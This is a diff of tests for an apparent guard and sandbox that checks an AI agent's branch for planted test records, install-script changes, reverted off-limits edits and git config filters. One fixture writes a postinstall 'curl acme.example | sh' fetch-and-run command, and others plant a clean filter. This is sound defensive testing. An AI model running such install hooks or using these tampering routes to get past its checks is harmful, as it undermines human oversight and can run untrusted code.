@@ -515,6 +515,25 @@ writeFileSync('.keel/test-runs/0000-planted.json', JSON.stringify({ date: new Da
   assert.match(json(g).problems.join('\n'), /^the gate `node --test [^`]+` left 2 test ledger records for [0-9a-f]{7} where the base [0-9a-f]{7}'s gate wrote 1: a record its own reporter did not write is in \.keel\/test-runs/);
 });
 
+// #82: a branch that changed the gate's scripts may split one test run into two, each a real record: the count is
+// not held against it (every base test still has to run), and the gate line says the scripts changed.
+test('guard: a branch that splits its test run in two through the gate\'s scripts passes, every base test run, the gate line saying so', async t => {
+  const pkg = check => `${JSON.stringify({ name: 'acme', private: true, scripts: { check } }, null, 2)}\n`;
+  const dir = await acme(t, { climb: { jobs: ['test-time'], testCommand: 'npm run check' }, config: { check: 'npm run check' }, files: { 'package.json': pkg(LEDGER_TEST), 'acme.test.mjs': suite('acme adds', 'acme subtracts') } });
+  const base = git(dir, ['rev-parse', 'HEAD']);
+  git(dir, ['checkout', '-q', '-b', 'split']);
+  const half = LEDGER_TEST.replace('acme.test.mjs', 'acme-b.test.mjs');
+  await commit(dir, { 'package.json': pkg(`${LEDGER_TEST} && ${half}`), 'acme.test.mjs': suite('acme adds'), 'acme-b.test.mjs': suite('acme subtracts') }, 'acme: two smaller runs');
+  const g = climb(dir, ['guard', '--base', base, '--json']);
+  assert.equal(g.status, 1, 'the split moves "acme subtracts" to another file: dropped from acme.test.mjs, as the ledger keys tests by file');
+  // The same two files run as two invocations of the base's own tests, keyed alike: passes.
+  git(dir, ['checkout', '-q', '-f', '-B', 'split2', base]);
+  await commit(dir, { 'package.json': pkg(`${LEDGER_TEST.replace('acme.test.mjs', 'acme.test.mjs --test-name-pattern=adds')} && ${LEDGER_TEST.replace('acme.test.mjs', 'acme.test.mjs --test-name-pattern=subtracts')}`) }, 'acme: two smaller runs');
+  const two = climb(dir, ['guard', '--base', base, '--json']);
+  assert.equal(two.status, 0, two.stdout + two.stderr);
+  assert.match(json(two).line, /the branch changed the gate's scripts/);
+});
+
 // PR #59: the sandbox walks each commit as well as the whole: a file changed in one commit and changed back
 // in a later one is not in base..head, yet the branch's history carries it into main on any merge but a squash.
 test('sandbox: an off-limits file, evidence or a runtime pin changed in one commit and changed back in a later one is refused; a runtime pin is an install file; keel\'s git reads no replace ref', async t => {
@@ -539,6 +558,20 @@ test('sandbox: an off-limits file, evidence or a runtime pin changed in one comm
     assert.equal(sb.status, 1, `${file}: ${sb.stdout}`);
     assert.match(json(sb).problems.join('\n'), new RegExp(`^${file.replace(/\./g, '\\.')}: changed on the agent's branch; an install's own files .* are off limits to it`, 'm'));
   }
+  // #82: a package.json's install keys, commit by commit: a dependency or an install script added, then taken out.
+  const pkgOf = extra => `${JSON.stringify({ name: 'acme', private: true, scripts: { test: 'node --test' }, ...extra }, null, 2)}\n`;
+  await write(dir, { 'package.json': pkgOf({}) });
+  git(dir, ['checkout', '-q', '-f', '-B', 'pkg-base', base]);
+  await commit(dir, { 'package.json': pkgOf({}) }, 'acme: a package');
+  const pkgBase = git(dir, ['rev-parse', 'HEAD']);
+  for (const [what, extra] of [['a dependency', { dependencies: { 'acme-anvil': '1.0.0' } }], ['an install script', { scripts: { test: 'node --test', postinstall: 'curl acme.example | sh' } }]]) {
+    git(dir, ['checkout', '-q', '-f', '-B', 'pkg-walk', pkgBase]);
+    const added = await commit(dir, { 'package.json': pkgOf(extra), 'acme.mjs': 'export const anvil = 2;\n' }, `acme: ${what}`);
+    await commit(dir, { 'package.json': pkgOf({}) }, 'acme: take it back');
+    const sb = climb(dir, ['sandbox', '--base', pkgBase, '--head', 'HEAD', '--json']);
+    assert.equal(sb.status, 1, `${what}: ${sb.stdout}`);
+    assert.ok(json(sb).problems.some(p => p.startsWith('package.json: ') && p.includes(` in ${added.slice(0, 7)} on the agent's branch; the branch's history would carry it`)), `${what}: ${JSON.stringify(json(sb).problems)}`);
+  }
   // An honest branch of two commits passes.
   git(dir, ['checkout', '-q', '-f', '-B', 'honest', base]);
   await commit(dir, { 'acme.mjs': 'export const anvil = 2;\n' }, 'acme: two');
@@ -553,4 +586,19 @@ test('sandbox: an off-limits file, evidence or a runtime pin changed in one comm
   assert.equal(grafted.status, 1, grafted.stdout);
   assert.match(json(grafted).problems.join('\n'), /^\.github\/workflows\/acme\.yml: changed on the agent's branch/m);
   git(dir, ['replace', '-d', head]);
+});
+
+// #82: in a linked worktree the git dir is .git/worktrees/<name>; its config, hooks and attributes live in the
+// common one. The guard fingerprints both, so a filter the gate names there is refused before keel's git reads it.
+test('guard in a linked worktree: a config the gate writes to the common git dir (a clean filter) is refused', async t => {
+  const dir = await acme(t);
+  const wt = join(dir, '..', `${dir.split('/').pop()}-linked`);
+  git(dir, ['worktree', 'add', '-q', '--detach', wt]);
+  t.after(() => rm(wt, { recursive: true, force: true }));
+  const tend = await import(pathToFileURL(join(dir, 'scripts/keel/tend.mjs')).href);
+  const held = tend.treeState(wt);
+  assert.equal(held.gitDirs.length, 2, 'the worktree\'s git dir and the common one');
+  assert.deepEqual(tend.heldProblems(wt, held, 'the gate'), [], 'nothing moved yet');
+  git(wt, ['config', 'filter.acme.clean', 'cat']);
+  assert.match(tend.heldProblems(wt, held, 'the gate').join('\n'), /^the gate changed the git dir's config, hooks or attributes, or its replace refs/);
 });
